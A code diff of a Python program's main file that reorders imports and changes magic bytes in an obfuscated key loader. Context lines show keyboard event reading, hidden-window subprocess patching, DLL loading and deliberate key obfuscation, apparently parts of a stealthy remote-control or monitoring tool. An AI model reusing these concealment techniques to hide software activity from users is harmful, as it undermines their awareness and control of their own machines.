@@ -64,6 +64,15 @@ from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, r
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN, KEY_UP
 from os.path import join, abspath, isdir, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
+from utils import *
+try:
+    from plugins import *
+except ImportError as e:
+    print(f"Plugins not loaded\n{e}\n")
+    plugins = None
+
+#TODO Add all the message boxes to a file un user_interaction/boxes.py
+
 # This is needed to understand if the file was compiled or not
 FROZEN = getattr(sys, 'frozen', False)
 if FROZEN:
@@ -109,7 +118,6 @@ except Exception as e:
     print(e)
     exit()
 
-from utils import SimpleFernet
 # algoritm to get the key from the obfuscated key file
 def get_real_key(key_path): #this function MUST stay in the main to remain obfuscated
     if not os.path.isfile(key_path):
@@ -122,7 +130,7 @@ def get_real_key(key_path): #this function MUST stay in the main to remain obfus
         raise RuntimeError("key.key too small")
 
     header = data[0:10]
-    if header[0:5] != b"RCPTE":
+    if header[0:5] != b"RCPTK":
         raise RuntimeError("Wrong magic bytes")
 
     jump = int.from_bytes(header[5:6], "big")
@@ -152,7 +160,7 @@ if DATA_ENCRYPTION:
     if not FERNET_KEY:
         print("FERNET KEY IS NONE")
         sys.exit(1)
-    FERNET = SimpleFernet(FERNET_KEY)
+    FERNET = SimpleFernet(FERNET_KEY, b"RCPTE")
 
 if isdir(DLLS_DIR):
     print(f"DLLS Directory exists: {DLLS_DIR}")
@@ -161,15 +169,6 @@ if isdir(DLLS_DIR):
             load_dll(join(DLLS_DIR, file))
 else:
     print(f"DLLS directory not does not exist or it was empty: {DLLS_DIR}")
-
-# UTILS
-# We import utils here so DLLS needed for modules are pre-loaded
-from utils import *
-try:
-    from plugins import *
-except ImportError as e:
-    print(f"Plugins not loaded\n{e}\n")
-    plugins = None
 
 # This will force every subprocess.Popen and os.system to be windowless
 def _patched_popen(*args, **kwargs):
